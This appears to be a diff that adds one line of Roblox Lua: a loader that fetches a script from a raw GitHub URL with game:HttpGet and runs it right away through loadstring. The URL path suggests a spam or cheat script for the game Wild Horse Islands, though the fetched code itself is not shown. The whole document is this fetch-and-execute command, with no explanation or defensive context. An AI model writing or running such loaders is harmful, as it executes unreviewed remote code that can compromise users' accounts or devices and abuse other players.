@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/wild-horse-islands-spam4-4ayv0e67jmujk0.lua"))()
